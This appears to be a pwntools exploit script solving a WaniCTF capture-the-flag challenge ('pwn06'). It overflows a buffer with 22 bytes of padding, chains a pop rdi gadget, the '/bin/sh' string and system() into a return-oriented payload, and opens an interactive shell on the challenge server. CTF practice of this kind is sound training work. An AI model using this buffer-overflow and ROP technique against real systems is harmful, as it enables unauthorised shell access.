from pwn import *
import sys

binary_name = "./pwn06" 
host = "ret.wanictf.org"
port = 9006 

elf = ELF(binary_name)
context.log_level = 'debug'

breakpoints = []
commands = ""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    # remote
	conn = remote(host, port)
elif len(sys.argv) >= 2 and sys.argv[1] == "d":
    # debug
    conn = gdb.debug(binary_name)
    # libv = elf.libc
else:
    # local
	conn = process(binary_name)
    # libc = elf.libc
    # libc = ELF(libc)

bin_sh = next(elf.search(b"/bin/sh\x00"))
pop_rdi = 0x0000000000400a53
ret_addr = 0x000000000040065e

payload = b""
payload += b"A" * 22
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret_addr)
payload += p64(elf.sym["system"])

# conn.sendlineafter(": ",payload)
conn.sendline(payload)

sleep(1)
conn.interactive()
